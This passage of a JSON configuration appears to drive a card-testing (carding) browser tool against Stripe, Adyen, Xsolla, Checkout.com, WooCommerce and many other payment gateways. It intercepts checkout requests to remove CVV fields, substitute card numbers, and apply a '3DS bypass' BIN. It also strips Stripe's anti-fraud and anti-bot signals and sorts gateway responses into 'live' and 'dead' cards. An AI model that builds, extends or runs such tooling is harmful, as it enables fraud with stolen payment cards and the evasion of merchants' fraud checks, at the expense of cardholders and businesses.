                                        "security code",
                                        "cvc",
                                        "cvv",
                                        "incorrect",
                                        "insufficient funds",
                                        "security code is invalid",
                                        "security code is incorrect",
                                        "incorrect security code",
                                        "invalid security code",
                                        "does not support this type of purchase",
                                        "previously used"
                                    ],
                                    "_comment": "v2.4.9 parity: WooCommerce-specific ('security code','cvc','cvv','incorrect') + Stripe shared (STRIPE_CCN_MESSAGES). 'incorrect' kept as-is — in WooCommerce error context it's payment-related. Per-gateway isolated (only wc-ajax=checkout URLs)."
                                },
                                "dead": {
                                    "codes": [],
                                    "messages": [
                                        "declined",
                                        "invalid card",
                                        "card number",
                                        "do not honor"
                                    ],
                                    "statuses": [
                                        "failure",
                                        "false"
                                    ],
                                    "_comment": "statuses:['failure'] = classic format catch-all DEAD. 'false' = modern format {success:false} where String(false)='false'. v2.4.9 parity: both result==='failure' and success===false return DEAD. matchGroup checks ccnLive BEFORE dead, so CCN patterns match first, unmatched failures fall through to this catch-all."
                                },
                                "expired": {
                                    "cardCodes": [],
                                    "sessionCodes": []
                                },
                                "subscription": {
                                    "codes": [],
                                    "messages": []
                                },
                                "messageOverrides": {},
                                "responsePaths": {
                                    "status": [
                                        "result",
                                        "success"
                                    ],
                                    "error": [
                                        "messages",
                                        "data.error.message",
                                        "data.message"
                                    ],
                                    "declineReason": [
                                        "messages",
                                        "data.error.message",
                                        "data.message"
                                    ],
                                    "_comment": "status paths: 'result' for classic format {result:'success'/'failure'}, 'success' for modern format {success:true/false}. error paths: 'messages' for classic HTML-wrapped errors, 'data.error.message' and 'data.message' for modern JSON format."
                                }
                            },
                            "skipPatterns": []
                        },
                        "xsolla": {
                            "id": "xsolla",
                            "displayName": "Xsolla",
                            "mode": "production",
                            "detection": {
                                "domains": [
                                    "secure.xsolla.com",
                                    "xsolla.com"
                                ],
                                "endpointPatterns": [
                                    "/directpayment",
                                    "/paystation",
                                    "/api/payment",
                                    "/api/checkout"
                                ],
                                "excludePatterns": [
                                    "analytics",
                                    "telemetry",
                                    "logging",
                                    "chat.xsolla.com",
                                    "communication-api",
                                    "consent-api",
                                    "afs.xsolla.com",
                                    "/v1/traces"
                                ],
                                "priority": 6,
                                "thirdPartySites": [{
                                    "id": "knownSites",
                                    "domains": [],
                                    "endpointPatterns": [],
                                    "skipPatterns": []
                                }]
                            },
                            "bypass": {
                                "action": "XSOLLA_ENCRYPT_REPLACE",
                                "gateway": "xsolla",
                                "encoding": "form-urlencoded",
                                "bypassEndpoints": [
                                    "/directpayment",
                                    "/paystation",
                                    "/api"
                                ],
                                "bypassTypes": [
                                    "CVV"
                                ],
                                "params": [
                                    "xps_encrypted_card"
                                ],
                                "regexRemovals": [
                                    "\"cvc\":\\s*\"[^\"]*\",?",
                                    "\"cvv\":\\s*\"[^\"]*\",?"
                                ],
                                "cardReplacementParams": {
                                    "_comment": "Xsolla card replacement is done via RSA re-encryption, not simple param replacement",
                                    "number": [
                                        "xps_encrypted_card"
                                    ],
                                    "exp_month": [
                                        "xps_encrypted_card"
                                    ],
                                    "exp_year": [
                                        "xps_encrypted_card"
                                    ],
                                    "cvc": [
                                        "xps_encrypted_card"
                                    ],
                                    "openCard": [
                                        "xps_open_card"
                                    ]
                                },
                                "encryptionParams": {
                                    "publicKeyField": "xps_public_key",
                                    "encryptedCardField": "xps_encrypted_card",
                                    "openCardField": "xps_open_card",
                                    "cvvBypass": true,
                                    "threeDSBypassBin": "414720"
                                }
                            },
                            "cardReplacementParams": {
                                "_comment": "Xsolla card replacement is done via RSA re-encryption, not simple param replacement",
                                "number": [
                                    "xps_encrypted_card"
                                ],
                                "exp_month": [
                                    "xps_encrypted_card"
                                ],
                                "exp_year": [
                                    "xps_encrypted_card"
                                ],
                                "cvc": [
                                    "xps_encrypted_card"
                                ],
                                "openCard": [
                                    "xps_open_card"
                                ]
                            },
                            "tracking": {
                                "domains": [
                                    "secure.xsolla.com",
                                    "xsolla.com"
                                ],
                                "excludePatterns": [
                                    "analytics",
                                    "telemetry",
                                    "logging",
                                    "chat.xsolla.com",
                                    "communication-api",
                                    "consent-api",
                                    "afs.xsolla.com",
                                    "/v1/traces"
                                ],
                                "endpoints": [
                                    "/directpayment",
                                    "/paystation",
                                    "/api/payment",
                                    "/api/checkout"
                                ],
                                "endpointPatterns": [],
                                "success": {
                                    "statuses": [
                                        "done",
                                        "success",
                                        "completed",
                                        "authorized",
                                        "1"
                                    ],
                                    "_comment": "Xsolla Pay Station returns status.group or status.statusData.stateText or status.title_class. state=1 is numeric success (v2.4.9 parity). Source: developers.xsolla.com redirects config + reference/xsolla_ref.log"
                                },
                                "ccnLive": {
                                    "codes": [],
                                    "messages": [
                                        "insufficient funds",
                                        "not enough"
                                    ],
                                    "_comment": "Xsolla errors[0].message contains bank decline reason text. 'insufficient funds' = card live but no balance. v2.4.9 parity: xsollaPatterns.ccnIndicators.messagePatterns. Proof: Roblox Xsolla response 'We couldn't process this transaction due to insufficient funds in your account'."
                                },
                                "dead": {
                                    "codes": [
                                        "3032",
                                        "1092",
                                        "1058",
                                        "1071",
                                        "1084",
                                        "3033",
                                        "1001",
                                        "3021",
                                        "1002",
                                        "3022"
                                    ],
                                    "messages": [],
                                    "statuses": [
                                        "failed",
                                        "declined",
                                        "error",
                                        "cancelled",
                                        "troubled",
                                        "canceled",
                                        "2"
                                    ],
                                    "_comment": "Error codes from help.xsolla.com/payments/most-common-error-codes. 'troubled' from official docs (error during payment/refund). state=2 is numeric failure (v2.4.9 parity). 1058=bank declined, 3032/1092=security block, 1071=payment system cancelled."
                                },
                                "expired": {
                                    "cardCodes": [],
                                    "sessionCodes": []
                                },
                                "subscription": {
                                    "codes": [],
                                    "messages": []
                                },
                                "messageOverrides": {},
                                "responsePaths": {
                                    "status": [
                                        "status.group",
                                        "status.statusData.stateText",
                                        "status.title_class",
                                        "status.statusData.state"
                                    ],
                                    "error": [
                                        "errors[0].code",
                                        "errors[0].message"
                                    ],
                                    "declineCode": [
                                        "errors[0].code",
                                        "error.code",
                                        "code"
                                    ],
                                    "declineReason": [
                                        "errors[0].message",
                                        "error.message",
                                        "message",
                                        "status.text.state"
                                    ]
                                }
                            },
                            "skipPatterns": [
                                "directpayment?pid=0"
                            ],
                            "xsollaConfig": {
                                "_comment": "Server-driven Xsolla config for client extension (V2.5 anti-crack). Client reads these to know WHAT to intercept. Without this config, client Xsolla module does nothing.",
                                "paramNames": {
                                    "encryptedCard": "xps_encrypted_card",
                                    "openCard": "xps_open_card",
                                    "publicKey": "xps_public_key"
                                },
                                "cvvFields": [
                                    "cvc",
                                    "encryptedSecurityCode",
                                    "cvv"
                                ],
                                "threeDSBypassBin": "414720",
                                "encryptPayloadFormat": {
                                    "numberField": "card_number",
                                    "yearField": "card_year",
                                    "monthField": "card_month",
                                    "cvvField": "cvv"
                                },
                                "openCardFormat": {
                                    "binField": "card_bin",
                                    "suffixField": "card_suffix",
                                    "yearField": "card_year",
                                    "monthField": "card_month"
                                }
                            }
                        },
                        "airwallex": {
                            "id": "airwallex",
                            "displayName": "Airwallex",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "pci-api.airwallex.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 20
                            }
                        },
                        "authorize": {
                            "id": "authorize",
                            "displayName": "Authorize.net",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "api2.authorize.net",
                                    "api.authorize.net"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 27
                            }
                        },
                        "basistheory": {
                            "id": "basistheory",
                            "displayName": "BasisTheory",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "js.basistheory.com",
                                    "api.basistheory.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "analytics",
                                    "sessions"
                                ],
                                "priority": 10
                            }
                        },
                        "blackhawknetwork": {
                            "id": "blackhawknetwork",
                            "displayName": "Blackhawk Network",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "notification.blackhawknetwork.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 30
                            }
                        },
                        "bluesnap": {
                            "id": "bluesnap",
                            "displayName": "BlueSnap",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "www1.bluesnap.com",
                                    "bluesnap.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 26
                            }
                        },
                        "braintree": {
                            "id": "braintree",
                            "displayName": "Braintree",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "payments.braintree-api.com",
                                    "assets.braintreegateway.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "analytics",
                                    "configuration",
                                    "client_api/v1/configuration"
                                ],
                                "priority": 8
                            }
                        },
                        "bytedance": {
                            "id": "bytedance",
                            "displayName": "ByteDance (CapCut/TikTok)",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "capcut.com",
                                    "www.capcut.com",
                                    "tiktok.com",
                                    "www.tiktok.com",
                                    "shop.tiktok.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "analytics",
                                    "telemetry",
                                    "log",
                                    "cdn"
                                ],
                                "priority": 15
                            }
                        },
                        "chargebee": {
                            "id": "chargebee",
                            "displayName": "Chargebee",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "chargebee.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "js.chargebee.com"
                                ],
                                "priority": 24
                            }
                        },
                        "computop": {
                            "id": "computop",
                            "displayName": "Computop",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "www.computop-paygate.com",
                                    "computop-paygate.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 33
                            }
                        },
                        "gr4vy": {
                            "id": "gr4vy",
                            "displayName": "Gr4vy",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "gr4vy.app"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "analytics",
                                    "sessions"
                                ],
                                "priority": 14
                            }
                        },
                        "grammarly": {
                            "id": "grammarly",
                            "displayName": "Grammarly",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "grammarly.com",
                                    "www.grammarly.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "analytics",
                                    "telemetry",
                                    "api/auth",
                                    "api/user"
                                ],
                                "priority": 12
                            }
                        },
                        "infinic": {
                            "id": "infinic",
                            "displayName": "Infinic",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "app.infinic.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 13
                            }
                        },
                        "nordpayments": {
                            "id": "nordpayments",
                            "displayName": "Nordpayments",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "nordpayments.com",
                                    "iframe-api.nordpayments.com",
                                    "iframe-card.nordpayments.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "/bin-details",
                                    "/v1/cards/"
                                ],
                                "priority": 8
                            }
                        },
                        "paddle": {
                            "id": "paddle",
                            "displayName": "Paddle",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "checkout-service.paddle.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 22
                            }
                        },
                        "pay360": {
                            "id": "pay360",
                            "displayName": "Pay360",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "api.pay360.com",
                                    "pay360.com",
                                    "hosted.pay360.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 45
                            }
                        },
                        "paypal": {
                            "id": "paypal",
                            "displayName": "PayPal",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "paypal.com",
                                    "api.paypal.com",
                                    "cors.api.paypal.com",
                                    "www.paypal.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "/sdk/js",
                                    "/smart/buttons",
                                    "/xoplatform",
                                    "/graphql",
                                    "/auth/",
                                    "/webapps/hermes",
                                    "/ncp/",
                                    "t.paypal.com",
                                    "/tracking/",
                                    "/heliosnext/",
                                    "/log",
                                    "/v1/r/d/b/",
                                    "logger.paypal.com",
                                    "/v1/notifications",
                                    "/v1/risk/"
                                ],
                                "priority": 5,
                                "thirdPartySites": [{
                                    "id": "pulsegiftcards",
                                    "domains": [],
                                    "endpointPatterns": [],
                                    "skipPatterns": []
                                }]
                            }
                        },
                        "paytrace": {
                            "id": "paytrace",
                            "displayName": "PayTrace",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "lev.paytrace.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 32
                            }
                        },
                        "payzen": {
                            "id": "payzen",
                            "displayName": "PayZen",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "api.payzen.eu",
                                    "secure.payzen.eu",
                                    "payzen.eu",
                                    "api.lyra.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 44
                            }
                        },
                        "processout": {
                            "id": "processout",
                            "displayName": "ProcessOut",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "api.processout.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 21
                            }
                        },
                        "razorpay": {
                            "id": "razorpay",
                            "displayName": "Razorpay",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "api.razorpay.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 28
                            }
                        },
                        "recharge": {
                            "id": "recharge",
                            "displayName": "Recharge",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "pay.recharge.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 29
                            }
                        },
                        "sagepay": {
                            "id": "sagepay",
                            "displayName": "Sagepay",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "pi-live.sagepay.com",
                                    "pi-test.sagepay.com",
                                    "sagepay.com",
                                    "opayo.co.uk"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 40
                            }
                        },
                        "securepay": {
                            "id": "securepay",
                            "displayName": "SecurePay",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "securepay.svcs.endurance.com",
                                    "api.securepay.com",
                                    "ps1.ncrsecurepay.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 31
                            }
                        },
                        "spreedly": {
                            "id": "spreedly",
                            "displayName": "Spreedly",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "core.spreedly.com",
                                    "spreedly.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 42
                            }
                        },
                        "square": {
                            "id": "square",
                            "displayName": "Square",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "pci-connect.squareup.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 23
                            }
                        },
                        "tebex": {
                            "id": "tebex",
                            "displayName": "Tebex",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "checkout.tebex.io",
                                    "tebex.io",
                                    "pay.tebex.io"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 43
                            }
                        },
                        "trustpay": {
                            "id": "trustpay",
                            "displayName": "TrustPay",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "tpgw.trustpay.eu",
                                    "gw.finby.eu"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 11
                            }
                        },
                        "wix": {
                            "id": "wix",
                            "displayName": "Wix",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "orderpage.wix.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "analytics",
                                    "telemetry"
                                ],
                                "priority": 9
                            }
                        },
                        "worldpay": {
                            "id": "worldpay",
                            "displayName": "Worldpay",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "access.worldpay.com",
                                    "secure.worldpay.com",
                                    "payments.worldpay.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 41
                            }
                        },
                        "xendit": {
                            "id": "xendit",
                            "displayName": "Xendit",
                            "mode": "research",
                            "detection": {
                                "domains": [
                                    "api.xendit.co"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [],
                                "priority": 25
                            }
                        }
                    },
                    "xhrBypass": {
                        "adyen": {
                            "enabled": true,
                            "action": "REMOVE_FROM_JSON",
                            "targets": [
                                "encryptedSecurityCode",
                                "encrypted_security_code"
                            ],
                            "domains": [
                                "adyen.com",
                                "checkoutshopper-live.adyen.com",
                                "checkoutshopper-test.adyen.com"
                            ]
                        },
                        "checkout": {
                            "enabled": true,
                            "action": "REMOVE_FROM_JSON",
                            "targets": [
                                "cvv"
                            ],
                            "domains": [
                                "api.checkout.com",
                                "card-acquisition-gateway.checkout.com",
                                "authentication-devices.checkout.com"
                            ]
                        },
                        "recurly": {
                            "enabled": true,
                            "action": "BLANK_IN_URLENCODED",
                            "targets": [
                                "cvv"
                            ],
                            "domains": [
                                "api.recurly.com"
                            ]
                        },
                        "stripe": {
                            "enabled": true,
                            "action": "REMOVE_FROM_URLENCODED",
                            "targets": [
                                "cvc",
                                "cvv",
                                "security_code",
                                "cvv2",
                                "cvc2",
                                "card[cvc]",
                                "card[cvv]",
                                "payment_method_data[card][cvc]",
                                "payment_method_options[card][cvc]",
                                "link[card][cvc]",
                                "source_data[card][cvc]",
                                "source[card][cvc]",
                                "billing_details[card][cvc]",
                                "payment_method[card][cvc]",
                                "setup_intent_data[card][cvc]",
                                "token[card][cvc]"
                            ],
                            "pauTargets": [
                                "payment_user_agent",
                                "payment_method_data[payment_user_agent]",
                                "source_data[payment_user_agent]"
                            ],
                            "zipTargets": [
                                "zip",
                                "postal_code",
                                "zip_code",
                                "postal",
                                "address_zip",
                                "card[address_zip]",
                                "card[postal_code]",
                                "card[zip]",
                                "billing_details[address][postal_code]",
                                "billing_details[address][zip]",
                                "billing_details[address][zip_code]",
                                "payment_method_data[billing_details][address][postal_code]",
                                "payment_method_data[billing_details][address][zip]",
                                "owner[address][postal_code]",
                                "owner[address][zip]",
                                "source_data[owner][address][postal_code]",
                                "address[postal_code]",
                                "address[zip]",
                                "address[zip_code]",
                                "billing[postal_code]",
                                "billing_address[postal_code]"
                            ],
                            "securityTargets": {
                                "pasted": [
                                    "pasted_fields",
                                    "payment_method_data[pasted_fields]",
                                    "source_data[pasted_fields]",
                                    "card[pasted_fields]",
                                    "billing_details[pasted_fields]"
                                ],
                                "timing": [
                                    "time_on_page",
                                    "payment_method_data[time_on_page]",
                                    "source_data[time_on_page]"
                                ],
                                "tracking": [
                                    "muid",
                                    "sid",
                                    "guid",
                                    "payment_method_data[muid]",
                                    "payment_method_data[sid]",
                                    "payment_method_data[guid]",
                                    "payment_method_data[referrer]",
                                    "payment_method_data[client_attribution_metadata]",
                                    "client_attribution_metadata"
                                ],
                                "antiBot": [
                                    "radar_options[hcaptcha_token]",
                                    "passive_captcha_token",
                                    "passive_captcha_ekey"
                                ]
                            },
                            "securityEnabled": true,
                            "emailReplaceTargets": [
                                "billing_details[email]",
                                "payment_method_data[billing_details][email]",
                                "receipt_email",
                                "owner[email]",
                                "source_data[owner][email]"
                            ],
                            "domains": [
                                "api.stripe.com",
                                "billing.stripe.com"
                            ]
                        },
                        "xsolla": {
                            "enabled": true,
                            "action": "XSOLLA_ENCRYPT_REPLACE",
                            "targets": [
                                "xps_encrypted_card"
                            ],
                            "encryptionParams": {
                                "publicKeyField": "xps_public_key",
                                "encryptedCardField": "xps_encrypted_card",
                                "openCardField": "xps_open_card",
                                "cvvBypass": true,
                                "threeDSBypassBin": "414720"
                            },
                            "domains": [
                                "secure.xsolla.com",
                                "xsolla.com"
                            ]
                        }
                    },
                    "cardReplacementParams": {
                        "adyen": {
                            "number": [
                                "encryptedCardNumber"
                            ],
                            "exp_month": [
                                "encryptedExpiryMonth"
                            ],
                            "exp_year": [
                                "encryptedExpiryYear"
                            ],
                            "cvc": [
                                "encryptedSecurityCode"
                            ]
                        },
                        "checkout": {
                            "number": [
                                "number"
                            ],
                            "exp_month": [
                                "expiry_month"
                            ],
                            "exp_year": [
                                "expiry_year"
                            ],
                            "cvc": [
                                "cvv"
                            ]
                        },
                        "recurly": {
                            "number": [
                                "number"
                            ],
                            "exp_month": [
                                "month"
                            ],
                            "exp_year": [
                                "year"
                            ],
                            "cvc": [
                                "cvv"
                            ]
                        },
                        "stripe": {
                            "number": [
                                "card[number]",
                                "payment_method_data[card][number]",
                                "source_data[card][number]",
                                "source[card][number]"
                            ],
                            "exp_month": [
                                "card[exp_month]",
                                "payment_method_data[card][exp_month]",
                                "source_data[card][exp_month]",
                                "source[card][exp_month]"
                            ],
                            "exp_year": [
                                "card[exp_year]",
                                "payment_method_data[card][exp_year]",
                                "source_data[card][exp_year]",
                                "source[card][exp_year]"
                            ],
                            "cvc": [
                                "card[cvc]",
                                "card[cvv]",
                                "payment_method_data[card][cvc]",
                                "source_data[card][cvc]",
                                "source[card][cvc]"
                            ]
                        },
                        "xsolla": {
                            "_comment": "Xsolla card replacement is done via RSA re-encryption, not simple param replacement",
                            "number": [
                                "xps_encrypted_card"
                            ],
                            "exp_month": [
                                "xps_encrypted_card"
                            ],
                            "exp_year": [
                                "xps_encrypted_card"
                            ],
                            "cvc": [
                                "xps_encrypted_card"
                            ],
                            "openCard": [
                                "xps_open_card"
                            ]
                        }
                    },
                    "skipPatterns": {
                        "adyen": [
                            "/analytics",
                            "/sessions/setup",
                            "/checkoutanalytics",
                            "/purchased-products",
                            "/recommendations",
                            "/wishlist",
                            "/properties/",
                            "/tokenize",
                            "/overview"
                        ],
                        "checkout": [
                            "/frames/callback",
                            "/cdn/frames"
                        ],
                        "stripe": [
                            "consumers/sessions/lookup",
                            "consumers/accounts",
                            "payment_pages/ephemeral_keys",
                            "setup_intents/validate",
                            "address_element",
                            "customer_session",
                            "experiments/lookup"
                        ],
                        "xsolla": [
                            "directpayment?pid=0"
                        ]
                    },
                    "paymentTracking": {
                        "adyen": {
                            "domains": [
                                "adyen.com",
                                "checkoutshopper-live.adyen.com",
                                "checkoutshopper-test.adyen.com"
                            ],
                            "excludePatterns": [
                                "binlookup",
                                "setup",
                                "analytics",
                                "log",
                                "fingerprint",
                                "telemetry",
                                "checkoutanalytics",
                                "checkout.com",
                                "google.com",
                                "doubleclick.net",
                                "facebook.com",
                                "tiktok.com"
                            ],
                            "endpoints": [
                                "/payments",
                                "/payment",
                                "/payments/adyen",
                                "/payment/adyen",
                                "/v1/checkout",
                                "/api/v2/payments/adyen",
                                "/en/payment/",
                                "/fr/payment/",
                                "/de/payment/",
                                "/es/payment/",
                                "/it/payment/",
                                "/pt/payment/",
                                "/transformer/api/v1/payments",
                                "/api/v1/subscription/adyen",
                                "/paymentDetails",
                                "/cards/verify",
                                "/invoices/",
                                "/client/trade/adyen/"
                            ],
                            "endpointPatterns": [],
                            "success": {
                                "statuses": [
                                    "Authorised",
                                    "received",
                                    "RedirectShopper",
                                    "redirected",
                                    "COMPLETED_SUCCESSFULLY",
                                    "ACCEPTED",
                                    "OK"
                                ],
                                "_comment": "OK = JetBrains custom success response ({status:'OK',code:'...'}). Standard Adyen uses resultCode (not status field), so OK only triggers on JetBrains /cards/verify endpoint. No false positive risk for standard Adyen sites."
                            },
                            "ccnLive": {
                                "codes": [
                                    "Not enough balance",
                                    "CVC Declined",
                                    "13",
                                    "24",
                                    "PAY-001"
                                ],
                                "messages": [
                                    "not enough balance",
                                    "cvc declined"
                                ],
                                "_comment": "Adyen refusalReasonCode 13 = Not enough balance (card live, no funds), 24 = CVC Declined (card live, wrong CVC). PAY-001 = Hotstar 'Not enough balance'. Numeric codes as strings for declineCodePaths matching."
                            },
                            "dead": {
                                "codes": [
                                    "Blocked Card",
                                    "Expired Card",
                                    "Invalid Card Number",
                                    "Acquirer Fraud",
                                    "FRAUD",
                                    "FRAUD-CANCELLED",
                                    "Restricted Card",
                                    "Issuer Suspected Fraud",
                                    "5",
                                    "6",
                                    "8",
                                    "14",
                                    "20",
                                    "22",
                                    "25",
                                    "31",
                                    "PAY-004",
                                    "PAY-008",
                                    "INVALID_PAYLOAD_CHARGE_REQUEST",
                                    "FAILURE_AT_PAYMENT_GATEWAY_END"
                                ],
                                "messages": [
                                    "csrf_error",
                                    "payment_failed",
                                    "invalid card number",
                                    "fraud",
                                    "invalid payload"
                                ],
                                "statuses": [
                                    "Refused",
                                    "Cancelled",
                                    "Error",
                                    "REJECTED",
                                    "CANCELED",
                                    "UNKNOWN_FAILURE",
                                    "failed",
                                    "payment_failed"
                                ],
                                "_comment": "Includes expired cards (code 6) as DEAD. Hotstar codes: PAY-004=Invalid Card, PAY-008=FRAUD, INVALID_PAYLOAD_CHARGE_REQUEST=CVV patched/empty payload, FAILURE_AT_PAYMENT_GATEWAY_END=gateway error."
                            },
                            "expired": {
                                "cardCodes": [],
                                "sessionCodes": [],
                                "statuses": [
                                    "EXPIRED",
                                    "UNFINISHED_PAYMENTS"
                                ],
                                "_comment": "Session/invoice expired — NOT card expired. Card expired = DEAD (refusalReasonCode 6)"
                            },
                            "subscription": {
                                "codes": [],
                                "messages": []
                            },
                            "messageOverrides": {
                                "charged": {
                                    "redirected": "Your order is complete"
                                },
                                "dead": {
                                    "failed": "Declined by bank",
                                    "INVALID_PAYLOAD_CHARGE_REQUEST": "cvc_required (CVV bypass patched)",
                                    "FAILURE_AT_PAYMENT_GATEWAY_END": "Gateway Error"
                                }
                            },
                            "responsePaths": {
                                "status": [
                                    "resultCode",
                                    "data.resultCode",
                                    "data.data.resultCode",
                                    "orderStatus",
                                    "aggregatedPaymentStatus",
                                    "type",
                                    "status",
                                    "item.status",
                                    "responseCode"
                                ],
                                "error": [
                                    "refusalReason",
                                    "errorCode",
                                    "description.responseCode"
                                ],
                                "declineCode": [
                                    "refusalReason",
                                    "refusalReasonCode",
                                    "data.refusalReason",
                                    "data.refusalReasonCode",
                                    "data.data.refusalReason",
                                    "data.data.refusalReasonCode",
                                    "errorCode",
                                    "responseCode",
                                    "description.responseCode"
                                ],
                                "declineReason": [
                                    "refusalReason",
                                    "data.refusalReason",
                                    "additionalData.refusalReasonRaw",
                                    "message"
                                ],
                                "amount": [
                                    "amount.value",
                                    "data.amount.value"
                                ],
                                "currency": [
                                    "amount.currency",
                                    "data.amount.currency"
                                ]
                            },
                            "thirdPartyTracking": {
                                "_comment": "Custom tracking logic for third-party sites using Adyen. Standard Adyen tracking (resultCode matching) works for most sites. GOG has custom response format.",
                                "gog": {
                                    "customSuccess": {
                                        "type": "redirected",
                                        "redirectionType": "internal",
                                        "_note": "Only trigger on payment endpoints (/checkout, /payment, /order), NOT on generic redirects. Also accept if response has orderStatus/aggregatedPaymentStatus/paymentId."
                                    },
                                    "customFailure": {
                                        "type": "failed"
                                    },
                                    "domainFilter": "gog.com",
                                    "skipEndpoints": [
                                        "/properties/",
                                        "/tokenize",
                                        "/users/",
                                        "/account/",
                                        "/stats"
                                    ]
                                }
                            }
                        },
                        "checkout": {
                            "domains": [
                                "api.checkout.com",
                                "card-acquisition-gateway.checkout.com",
                                "authentication-devices.checkout.com"
                            ],
                            "excludePatterns": [
                                "/frames/callback",
                                "/cdn/frames",
                                "/cdn-cgi/"
                            ],
                            "endpoints": [
                                "/tokens",
                                "/payment-sessions/",
                                "/submit",
                                "/3ds/",
                                "/device-information"
                            ],
                            "endpointPatterns": [],
                            "success": {
                                "statuses": [
                                    "Authorized",
                                    "Captured",
                                    "Card Verified",
                                    "Paid"
                                ],
                                "_statuses_source": "Official docs: status field values for successful payments. 'Approved' removed — that's response_summary, not status field. matchGroup Step 2 checks responsePaths.status paths.",
                                "htmlPatterns": [
                                    "RedirectReason: 'success'"
                                ],
                                "urlPatterns": [
                                    "confirmation?"
                                ]
                            },
                            "ccnLive": {
                                "codes": [
                                    "not_enough_funds",
                                    "20051",
                                    "200N7"
                                ],
                                "_codes_source": {
                                    "20051": "Official docs — response_code for 'Insufficient Funds' (soft decline, card valid)",
                                    "not_enough_funds": "PHP ref proven — decline_reason field value",
                                    "200N7": "Official docs — response_code for 'Decline for CVV2 failure' (card valid, CVV wrong)"
                                },
                                "messages": [
                                    "insufficient funds"
                                ],
                                "_messages_source": "Official docs response example: response_summary = 'Insufficient Funds'. Fallback text match via matchGroup Step 4. Per-gateway isolated — no cross-gateway false positive.",
                                "htmlPatterns": [
                                    "3DS2 Challenge",
                                    "3DS Challenge"
                                ]
                            },
                            "dead": {
                                "statuses": [
                                    "Declined"
                                ],
                                "_statuses_source": "Official docs: status field = 'Declined' on authorization failure. Moved from codes[] — 'Declined' is a status value, not a decline code. matchGroup Step 2 matches via responsePaths.status.",
                                "codes": [
                                    "invalid_customer_data",
                                    "card_number_invalid",
                                    "20005",
                                    "20054",
                                    "30033"
                                ],
                                "_codes_source": {
                                    "20005": "Official docs — 'Declined - Do not honour' (most common bank decline)",
                                    "20054": "Official docs — 'Expired card' (card expired = dead, consistent with Adyen config)",
                                    "30033": "Official docs — 'Expired card - Pick up' (hard decline)",
                                    "invalid_customer_data": "PHP ref — email/card/IP banned by merchant",
                                    "card_number_invalid": "PHP ref — invalid card number (tokenization stage)"
                                },
                                "messages": [],
                                "htmlPatterns": [
                                    "RedirectReason: 'failure'",
                                    "RedirectReason: 'declined'"
                                ],
                                "urlPatterns": [
                                    "failure?"
                                ]
                            },
                            "expired": {
                                "cardCodes": [],
                                "sessionCodes": [
                                    "payment_attempts_exceeded",
                                    "payment_session_paid"
                                ],
                                "_note": "payment_attempts_exceeded = invoice voided (PHP ref: session_expired: true). payment_session_paid = already paid by another card. Both should stop automation loop.",
                                "_sessionCodes_source": {
